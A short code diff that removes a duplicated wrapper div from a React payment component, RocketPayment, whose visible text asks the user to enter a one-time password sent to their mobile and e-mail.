@@ -199,7 +199,6 @@ const RocketPayment = () => {
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
-          <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
             <p className="text-[11px] min-[375px]:text-xs text-[#333] leading-relaxed mb-3" style={{ fontFamily: 'Arial, sans-serif' }}>
               An OTP (One Time Password) has been sent to your registered mobile and e-mail. Please input the OTP for verification.
             </p>
